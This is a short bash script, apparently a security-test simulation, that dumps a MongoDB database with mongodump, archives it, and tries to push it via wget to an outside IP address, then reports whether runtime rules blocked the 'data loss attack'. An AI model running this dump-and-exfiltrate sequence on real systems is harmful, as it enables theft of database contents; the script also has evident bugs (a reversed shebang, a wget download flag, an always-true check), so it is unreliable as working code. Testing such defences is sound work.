!#/bin/bash
attackFailed="false"

cd /home
echo "in perf"
response=$(mongodump -h mongodb 2>&1)

echo "response: $response"

sleep 2
prevented=$(echo $response | grep "Operation not permitted")
if [ -n "$prevented" ]; then
   echo $response
   echo "mongodump operation prevented by runtime process rule"
   attackFailed="true"
fi

tar -czf dump.tar.gz dump
response=$(wget --header="Content-type: multipart/form-data boundary=FILEUPLOAD" -O dump.tar.gz http://35.184.86.115:8082)
blocked=$(echo $response | grep "unable to resolve host")

[[ -n "blocked" ]] && echo $response && attackFailed="true"

if [ "$attackFailed" == "false" ]; then
  echo "++ attack script brought in via DNS outbound request!  ++"
  echo "!----------- DATA LOSS ATTACK SUCCESSFUL ----------------" 
else
  echo ">>> attempt DNS based outbound push data prevented ****"
  echo "-------------- DATA LOSS ATTACK FAILED ----------------"
fi



